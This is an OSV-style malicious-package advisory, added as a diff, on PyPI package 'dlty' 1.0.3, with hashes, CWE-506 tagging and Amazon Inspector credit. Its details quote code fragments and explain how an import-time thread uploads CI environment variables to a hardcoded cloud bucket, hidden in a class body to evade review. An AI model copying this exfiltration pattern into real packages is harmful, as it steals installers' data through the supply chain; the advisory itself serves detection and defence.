@@ -1,0 +1,90 @@
+{
+  "modified": "2026-05-12T19:03:07Z",
+  "published": "2026-05-12T07:44:00Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "dlty 1.0.3: import-time exfiltration of environment variables to hardcoded GCS bucket",
+  "details": "Importing the `dlty` package triggers an active data-exfiltration channel from the installer to third-party-controlled infrastructure. `dlty/__init__.py` imports `dlty.dlt`, which defines a class `DataLeakTest` whose class body contains `threading.Thread(target=leak_data).start()` — meaning the thread runs at class-definition/import time, not on instantiation. The target function `leak_data` (dlty/dlt.py) first performs an HTTP GET to https://www.google.de as a connectivity probe, then reads the environment variables RUN, PIPELINE, STEP and uploads them with a timestamp as a blob to the hardcoded Google Cloud Storage bucket `data-leak-test` via `storage.Client().get_bucket('data-leak-test').blob(run).upload_from_string(...)`. This uses the installer's ambient GCP credentials (Application Default Credentials) to write installer-side environment variables (commonly CI/CD metadata) to author-controlled storage. Exceptions are swallowed with a reassuring print, and the exfiltration is placed in a class body rather than __init__ to make it less visible during casual review. Metadata fields are placeholders (Example Author, pypa/sampleproject URL), the README is a single line, and the package name does not advertise any of this behavior. This is a one-way installer→attacker exfiltration path and meets the criteria for an active supply-chain attack.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "dlty"
+      },
+      "versions": [
+        "1.0.3"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "domains": [
+            "www.google.de"
+          ],
+          "evidence_files": [
+            {
+              "path": "dlty/dlt.py",
+              "sha256": "c6c893dd1ca2aa41552774053f30ba70c2d83018baa301eb58de2a50fce63ed2",
+              "tlsh": "ba21fb93795836ba4b03521cd14593500f73bc3bb79a7020f8bc53a81f2897eb02aba4"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "dlty-1.0.3-py3-none-any.whl",
+              "hashes": {
+                "blake2b_256": "dfa975c0f2cd6281b0bca268148ac261404bc700f025b6e827974e1d3b52e396",
+                "md5": "686ac446d71b5a09cead13f16452883b",
+                "sha256": "bc1e0181a702da185c2ce2469093d204215970a372472475b56db8233a973024"
+              }
+            },
+            {
+              "filename": "dlty-1.0.3.tar.gz",
+              "hashes": {
+                "blake2b_256": "0384ad464c1741895c9f469d3afdc2420228aded7fb49f8376ade03895488164",
+                "md5": "ba456d592c772500edb6cb8818fd0261",
+                "sha256": "9360da3cd50e4c13d7bb53672b167cb972598a22eb3c4e95734dc77b071eaff7"
+              }
+            }
+          ],
+          "urls": [
+            "https://www.google.de"
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/dlty/1.0.3/"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "actran@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "494f5fbab24a26771e84ce06eea5303b7d1b9135b505a6d93a01c417603f1902",
+        "import_time": "2026-05-13T20:10:56.630465706Z",
+        "id": "IN-MAL-2026-002381",
+        "modified_time": "2026-05-12T19:03:07Z",
+        "versions": [
+          "1.0.3"
+        ]
+      }
+    ]
+  }
+}
